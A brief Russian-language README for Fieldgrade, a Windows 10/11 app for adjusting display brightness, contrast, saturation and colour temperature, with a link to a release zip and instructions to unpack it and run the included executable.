# Fieldgrade

Приложение для настройки яркости, контраста, насыщенности и температуры цвета на Windows 10/11 x64.

[Скачать Fieldgrade-Windows.zip](https://github.com/AndreyabsoluteEZ/Rob-Run-graphics/releases/download/v1.0.0/Fieldgrade-Windows.zip)

Распакуйте архив целиком и запустите `Fieldgrade.exe`. Архив также содержит исходники, инструкцию и контрольные суммы.
